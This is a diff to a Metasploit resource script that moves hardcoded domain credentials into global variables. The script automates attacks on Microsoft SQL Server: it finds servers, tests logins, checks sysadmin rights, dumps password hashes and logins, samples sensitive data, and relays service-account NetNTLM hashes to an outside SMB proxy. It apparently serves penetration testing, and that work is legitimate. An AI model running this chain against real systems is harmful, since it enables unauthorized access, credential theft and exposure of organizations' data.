@@ -3,6 +3,13 @@
 #---------------------------------
 spool /tmp/msf-sql.log
 
+#---------------------------------
+# Setup global vars
+#---------------------------------
+setg USERNAME User1
+setg PASSWORD Password1
+setg USE_WINDOWS_AUTHENT true
+setg DOMAIN acme.com
 
 #---------------------------------
 # Identify live SQL Servers
@@ -17,10 +24,6 @@ exploit
 # Test access with domain creds
 #---------------------------------
 use auxiliary/scanner/mssql/mssql_login
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set VERBOSE false
 set THREADS 50
  
@@ -41,10 +44,6 @@ end
 # Test for sysadmin access
 #---------------------------------
 use auxiliary/admin/mssql/mssql_sql
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set VERBOSE false
 set THREADS 50
 set sql select \'server: \'  + @@servername + \',sysadmin: \' + cast(IS_SRVROLEMEMBER(\'sysadmin\') as varchar(10)) + \',links: \' + (select cast((select count(srvname) from master..sysservers) as varchar(10))) + \',clustered: \' + (select cast(SERVERPROPERTY(\'IsClustered\') as varchar(10))) as OUTPUT
@@ -66,10 +65,6 @@ end
 # List accessible databases
 #---------------------------------
 use auxiliary/admin/mssql/mssql_sql
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set VERBOSE false
 set THREADS 50
 set sql select name from master..sysdatabases where has_dbaccess(name)=1
@@ -91,10 +86,6 @@ end
 # Dump accessible config info
 #---------------------------------
 use auxiliary/admin/mssql/mssql_enum
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set VERBOSE false
  
 <ruby>
@@ -114,10 +105,6 @@ end
 # Dump password hashes if possible
 #---------------------------------
 use auxiliary/scanner/mssql/mssql_hashdump
-set USERNAME User1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set VERBOSE false
 set THREADS 1
  
@@ -137,10 +124,6 @@ end
 # Dump all of the SQL logins
 #---------------------------------
 use auxiliary/admin/mssql/mssql_enum_sql_logins
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set FuzzNum 500
 set VERBOSE false
  
@@ -161,10 +144,6 @@ end
 # Dump sample of senstitve data
 #---------------------------------
 use auxiliary/admin/mssql/mssql_findandsampledata
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set SAMPLE_SIZE 5
 set VERBOSE true
  
@@ -185,10 +164,6 @@ end
 # Capture service account NetNTLM hashes 
 #----------------------------------------
 use auxiliary/admin/mssql/mssql_ntlm_stealer
-set USERNAME user1
-set PASSWORD Password1
-set USE_WINDOWS_AUTHENT true
-set DOMAIN acme.com
 set SMBPROXY 10.0.0.230
 set VERBOSE false
 set THREADS 50
